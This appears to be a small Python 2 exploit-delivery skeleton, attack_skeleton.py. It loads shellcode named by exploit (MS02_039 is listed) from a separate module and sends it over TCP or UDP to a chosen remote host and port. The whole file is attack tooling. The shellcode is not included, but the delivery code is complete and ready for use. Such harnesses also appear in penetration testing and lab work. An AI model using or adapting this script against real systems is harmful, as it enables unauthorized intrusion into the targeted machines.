#!/usr/bin/env python2
"""
Usage:
  attack_skeleton.py    -h | --help
  attack_skeleton.py    (--rhost=<rhost> --rport=<rport> --proto=<proto> --exploit=<exploit>) [--iface=<iface>]

Options:
  --rhost=<rhost>       host to attack
  --rport=<rport>       host port to attack
  --iface=<iface>       source interface
  --proto=<proto>       udp or tcp
  --exploit=<exploit>   shellcode for specific exploit must be loaded into script for your handler

Exploit Choices:
    MS02_039
"""

import subprocess
import shellcode  # <-Insert payload in this file
from socket import AF_INET, SOCK_DGRAM, SOCK_STREAM, socket
from docopt import docopt
from netifaces import ifaddresses


def send_udp(rhost, rport, payload, iface=None):
    '''Send a payload to a udp port'''
    print("sending payload to {} at port {} udp".format(rhost, rport))
    my_sock = socket(AF_INET, SOCK_DGRAM)
    if iface:
        iface_ip = ifaddresses(iface)[AF_INET][0]['addr']
        my_sock.bind((iface_ip, 0))
    my_sock.sendto(payload, (rhost, int(rport)))
    print("payload sent")

def send_tcp(rhost, rport, payload, iface=None):
    '''Send a payload to a tcp port'''
    print("sending payload to {} at port {} tcp".format(rhost, rport))
    soc = socket(AF_INET,SOCK_STREAM)
    soc.settimeout(2)
    if iface:
        iface_ip = ifaddresses(iface)[AF_INET][0]['addr']
        soc.bind((iface_ip, 0))
    soc.connect((rhost, int(rport)))
    soc.send(payload)
    response = soc.recv(1024)  # not sure if we care to receive?
    print("payload sent")

def main():
    opts = docopt(__doc__)
    print(opts)
    iface = opts['--iface']
    rhost = opts['--rhost']
    rport = opts['--rport']
    proto = opts['--proto']
    exploit = opts['--exploit']
    try:
        payload = getattr(shellcode, exploit)
        print(payload)
        if proto.lower() == "tcp":
            send_tcp(rhost=rhost, rport=rport, iface=iface, payload=payload)
        elif proto.lower() == "udp":
            send_udp(rhost=rhost, rport=rport, iface=iface, payload=payload)
        else:
            print("protocol must be either udp or tcp, not {}".format(proto))
    except Exception as ex:
        print("something broke.... blah")
        print(str(ex))

if __name__ == '__main__':
    main()
